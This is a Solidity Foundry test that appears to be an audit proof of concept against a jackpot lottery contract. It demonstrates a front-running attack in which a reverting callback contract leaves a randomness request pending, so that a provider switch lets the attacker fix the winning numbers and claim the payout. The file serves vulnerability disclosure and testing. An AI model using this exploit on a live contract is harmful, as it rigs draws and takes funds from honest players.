// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {Jackpot, IJackpot} from "contracts/Jackpot.sol";
import {JackpotTicketNFT, IJackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
import {EntropyMock} from "contracts/mocks/EntropyMock.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IEntropyComplete} from "contracts/interfaces/IEntropyComplete.sol";
import {EntropyEvents, EntropyStructs} from "@pythnetwork/entropy-sdk-solidity/EntropyEvents.sol";
import {EntropyStructsV2} from "@pythnetwork/entropy-sdk-solidity/EntropyStructsV2.sol";
import {Test, console2} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";

contract ScaledEntropyProviderTest is Test {
    ERC20Mock usdcMock;
    Jackpot jackpot;
    JackpotLPManager jackpotLPManager;
    JackpotTicketNFT jackpotNFT;
    ScaledEntropyProvider scaledEntropyProvider;
    GuaranteedMinimumPayoutCalculator payoutCalculator;
    JackpotBridgeManager jackpotBridgeManager;
    uint256 constant PRECISE_UNIT = 1e18;
    IEntropyComplete entropy;

    uint256 drawingDurationInSeconds = 86400; //1 day in seconds
    uint8 normalBallMax = 30;
    uint8 bonusballMin = 5;
    uint256 lpEdgeTarget = 0.3e18;
    uint256 reserveRatio = 0.2e18;
    uint256 referralFee = 0.065e18;
    uint256 referralWinShare = 0.05e18;
    uint256 protocolFee = 0.01e18;
    uint256 protocolFeeThreshold = 1e6;
    uint256 ticketPrice = 1e6;
    uint256 maxReferrers = 5;
    uint32 entropyBaseGasLimit = 10000000;
    uint32 entropyVariableGasLimit = 250000;
    uint256 entropyFee = 0.00005e18;
    uint256 minimumPayout = 1e6;
    uint256 premiumTierMinAllocation = 0.2e18;
    bool[12] minPayoutTiers = [false, true, false, true, true, true, true, true, true, true, true, true];
    uint256[12] premiumTierWeights =
        [0, 0.17e18, 0, 0.13e18, 0.12e18, 0.05e18, 0.05e18, 0.02e18, 0.02e18, 0.01e18, 0.04e18, 0.39e18];
    bytes32 source = bytes32(bytes("test"));

    //actors
    address owner = makeAddr("owner");
    address buyerOne = makeAddr("buyerOne");
    address buyerTwo = makeAddr("buyerTwo");
    address pythEntropyProviderOne = makeAddr("pythEntropyProviderOne");
    address pythEntropyProviderTwo = makeAddr("pythEntropyProviderTwo");
    uint256 initialUSDCAmount = 1000000000e6;
    bytes32 providerContribution = "hello";
    bytes32 providerContribution2 = keccak256(abi.encodePacked(providerContribution));

    function setUp() external {
        vm.startPrank(owner);
        usdcMock = new ERC20Mock();
        usdcMock.mint(owner, initialUSDCAmount);

        jackpot = new Jackpot(
            drawingDurationInSeconds,
            normalBallMax,
            bonusballMin,
            lpEdgeTarget,
            reserveRatio,
            referralFee,
            referralWinShare,
            protocolFee,
            protocolFeeThreshold,
            ticketPrice,
            maxReferrers,
            entropyBaseGasLimit
        );
        jackpotLPManager = new JackpotLPManager(jackpot);
        jackpotNFT = new JackpotTicketNFT(jackpot);
        entropy = IEntropyComplete(0x6E7D74FA7d5c90FEF9F0512987605a6d546181Bb); //entropy base mainnet address
        scaledEntropyProvider = new ScaledEntropyProvider(address(entropy), pythEntropyProviderOne);
        payoutCalculator = new GuaranteedMinimumPayoutCalculator(
            jackpot, minimumPayout, premiumTierMinAllocation, minPayoutTiers, premiumTierWeights
        );

        jackpot.initialize(usdcMock, jackpotLPManager, jackpotNFT, scaledEntropyProvider, payoutCalculator);

        jackpot.initializeLPDeposits(10000000e6);

        usdcMock.approve(address(jackpot), 1000000);

        jackpot.lpDeposit(1000000);

        jackpot.initializeJackpot(block.timestamp + drawingDurationInSeconds);

        vm.stopPrank();

        bytes32 providerCommitment = bytes32(keccak256(abi.encodePacked(providerContribution2)));
        //Providers will register themselves to entropy
        hoax(pythEntropyProviderOne, 10 ether);
        entropy.register(0.001e18,providerCommitment, "", 10000, "");

        hoax(pythEntropyProviderTwo, 10 ether);
        entropy.register(0.001e18,providerCommitment, "", 10000, "");

        uint128 fee = entropy.getFeeV2(pythEntropyProviderOne, 0);
        //Let's increment the sequence number for provider 2 to create realistic situation
        entropy.requestV2{value: fee}(pythEntropyProviderOne, providerContribution2, 0);

        EntropyStructsV2.ProviderInfo memory pythEntropyProviderOneInfo =
            entropy.getProviderInfoV2(pythEntropyProviderOne);
        assertEq(pythEntropyProviderOneInfo.sequenceNumber, 2);

        //while the sequence number for privider two is at 1, it will wait for one transaction to go though, before the attack could come into play
        EntropyStructsV2.ProviderInfo memory pythEntropyProviderTwoInfo =
            entropy.getProviderInfoV2(pythEntropyProviderTwo);
        assertEq(pythEntropyProviderTwoInfo.sequenceNumber, 1);
    }

    function testFrontRunSetEntropyProviderToBecomeWinner() external {
        usdcMock.mint(buyerOne, 10e6);
        vm.prank(buyerOne);
        usdcMock.approve(address(jackpot), 5e6);

        uint8[] memory normalsSet1 = new uint8[](5);
        normalsSet1[0] = 1;
        normalsSet1[1] = 23;
        normalsSet1[2] = 6;
        normalsSet1[3] = 16;
        normalsSet1[4] = 12;

        uint8[] memory normalsSet2 = new uint8[](5);
        normalsSet2[0] = 6;
        normalsSet2[1] = 7;
        normalsSet2[2] = 8;
        normalsSet2[3] = 9;
        normalsSet2[4] = 10;

        uint8[] memory normalsSet3 = new uint8[](5);
        normalsSet3[0] = 26;
        normalsSet3[1] = 17;
        normalsSet3[2] = 8;
        normalsSet3[3] = 29;
        normalsSet3[4] = 10;

        // Correct way to create an array of structs
        IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](3);
        tickets[0] = IJackpot.Ticket({normals: normalsSet1, bonusball: 2});
        tickets[1] = IJackpot.Ticket({normals: normalsSet2, bonusball: 2});
        tickets[2] = IJackpot.Ticket({normals: normalsSet3, bonusball: 3});
        address[] memory referrers;
        uint256[] memory referrerSplits;

        vm.prank(buyerOne);
        uint256[] memory ticketIds = jackpot.buyTickets(tickets, buyerOne, referrers, referrerSplits, source);

        //attacker will going to purchase ticket with [1,2,3,4,5] and bonus ballno. = 1
        uint8[] memory normalsSet4 = new uint8[](5);
        normalsSet4[0] = 1;
        normalsSet4[1] = 2;
        normalsSet4[2] = 3;
        normalsSet4[3] = 4;
        normalsSet4[4] = 5;
        IJackpot.Ticket[] memory ticketsForAttacker = new IJackpot.Ticket[](10);

        for (uint256 i; i < ticketsForAttacker.length; i++) {
            ticketsForAttacker[i] = IJackpot.Ticket({normals: normalsSet4, bonusball: 1});
        }

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 5 ether);
        usdcMock.mint(attacker, 10e6);

        vm.startPrank(attacker);
        usdcMock.approve(address(jackpot), 10e6);
        uint256[] memory ticketIdAttacker =
            jackpot.buyTickets(ticketsForAttacker, attacker, referrers, referrerSplits, source);

        //Attacker will call request randomness to set pending request
        IScaledEntropyProvider.SetRequest[] memory setRequests = new IScaledEntropyProvider.SetRequest[](2);
        setRequests[0] = IScaledEntropyProvider.SetRequest({
            samples: 5,
            minRange: uint256(1),
            maxRange: uint256(5),
            withReplacement: false
        });
        setRequests[1] = IScaledEntropyProvider.SetRequest({
            samples: 1,
            minRange: uint256(1),
            maxRange: uint256(1),
            withReplacement: false
        });
        Jackpot.DrawingState memory drawingState = jackpot.getDrawingState(1);
        uint32 entropyGasLimit = entropyBaseGasLimit + entropyVariableGasLimit * uint32(drawingState.bonusballMax);
        uint256 fee = scaledEntropyProvider.getFee(entropyGasLimit);
        Random randomCallback = new Random(scaledEntropyProvider);

        vm.recordLogs();

        uint64 sequenceNo = randomCallback.requestPythEntropy{value: fee}(entropyGasLimit, setRequests);
        vm.stopPrank();
        Vm.Log[] memory entriesOne = vm.getRecordedLogs();

        bytes32 requestedWithCallbackSigOne = keccak256(
            "RequestedWithCallback(address,address,uint64,bytes32,(address,uint64,uint32,bytes32,uint64,address,bool,bool))"
        );
        bytes32 userContributionOne;
        for (uint256 i = 0; i < entriesOne.length; i++) {
            if (entriesOne[i].topics[0] == requestedWithCallbackSigOne) {
                (userContributionOne,) = abi.decode(entriesOne[i].data, (bytes32, EntropyStructs.Request));
                break;
            }
        }

        vm.prank(pythEntropyProviderOne);
        vm.expectPartialRevert(ScaledEntropyProvider.CallbackFailed.selector); //made to fail to keep pending request intact
        entropy.revealWithCallback(pythEntropyProviderOne, sequenceNo, userContributionOne, providerContribution);

        EntropyStructsV2.ProviderInfo memory pythEntropyProviderOneInfo =
            entropy.getProviderInfoV2(pythEntropyProviderOne);

        assertEq(pythEntropyProviderOneInfo.sequenceNumber, 3);

        //owner will try to update the entryopyProvider
        vm.prank(owner);
        scaledEntropyProvider.setEntropyProvider(pythEntropyProviderTwo);

        //now attacker will wait until sequence number reaches 3
        uint128 fee2 = entropy.getFeeV2(pythEntropyProviderTwo, 0);
        //random transaction for sequence number to increase to desired value
        entropy.requestV2{value: fee2}(pythEntropyProviderTwo, providerContribution2, 0);

        EntropyStructsV2.ProviderInfo memory pythEntropyProviderTwoInfo =
            entropy.getProviderInfoV2(pythEntropyProviderTwo);
        assertEq(pythEntropyProviderTwoInfo.sequenceNumber, 2);

        //as soon as sequence no. reaches 2, attacker will call run jackpot after drawingdurationtime
        vm.warp(block.timestamp + drawingDurationInSeconds + 1);
        //entropyGasLimit
        uint256 feeForRun = entropy.getFeeV2(pythEntropyProviderTwo, entropyGasLimit);
        vm.prank(attacker);

        vm.recordLogs();
        jackpot.runJackpot{value: feeForRun}();

        Vm.Log[] memory entries = vm.getRecordedLogs();

        bytes32 requestedWithCallbackSig = keccak256(
            "RequestedWithCallback(address,address,uint64,bytes32,(address,uint64,uint32,bytes32,uint64,address,bool,bool))"
        );
        bytes32 userContribution;
        for (uint256 i = 0; i < entries.length; i++) {
            if (entries[i].topics[0] == requestedWithCallbackSig) {
                (userContribution,) = abi.decode(entries[i].data, (bytes32, EntropyStructs.Request));
                break;
            }
        }

        //@note provider two will call revealWithCallback to process callback request
        vm.prank(pythEntropyProviderTwo);
        entropy.revealWithCallback(pythEntropyProviderTwo, sequenceNo, userContribution, providerContribution);

        uint256 attackerBeforeBalance = usdcMock.balanceOf(attacker);
        vm.prank(attacker);
        jackpot.claimWinnings(ticketIdAttacker);
        uint256 attackerAfterBalance = usdcMock.balanceOf(attacker);
        assertEq(attackerAfterBalance - attackerBeforeBalance, 2630550);
        
        uint256 buyerOneBeforeBalance = usdcMock.balanceOf(buyerOne);
        vm.prank(buyerOne);
        jackpot.claimWinnings(ticketIds);
        uint256 buyerOneAfterBalance = usdcMock.balanceOf(buyerOne);
        assertEq(buyerOneAfterBalance - buyerOneBeforeBalance, 0);
    }
}

contract Random {
    ScaledEntropyProvider immutable i_scaledEntropyProvider;

    constructor(ScaledEntropyProvider scaledEntropyProvider) {
        i_scaledEntropyProvider = scaledEntropyProvider;
    }

    function requestPythEntropy(uint32 gasLimit, IScaledEntropyProvider.SetRequest[] memory requests)
        external
        payable
        returns (uint64 sequence)
    {
        sequence = i_scaledEntropyProvider.requestAndCallbackScaledRandomness{value: msg.value}(
            gasLimit, requests, this.revertFunction.selector, ""
        );
    }

    function revertFunction() external pure {
        require(false, "Error needed");
    }
}
